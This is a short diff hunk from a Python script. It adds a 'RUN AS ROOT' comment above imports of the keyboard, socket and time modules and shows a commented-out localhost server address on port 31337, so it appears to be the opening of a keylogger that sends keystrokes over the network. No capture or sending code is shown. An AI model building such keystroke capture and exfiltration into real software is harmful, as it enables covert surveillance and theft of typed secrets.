@@ -1,3 +1,4 @@
+# RUN AS ROOT
 import keyboard, socket, time
 
 #server = ("127.0.0.1", 31337)
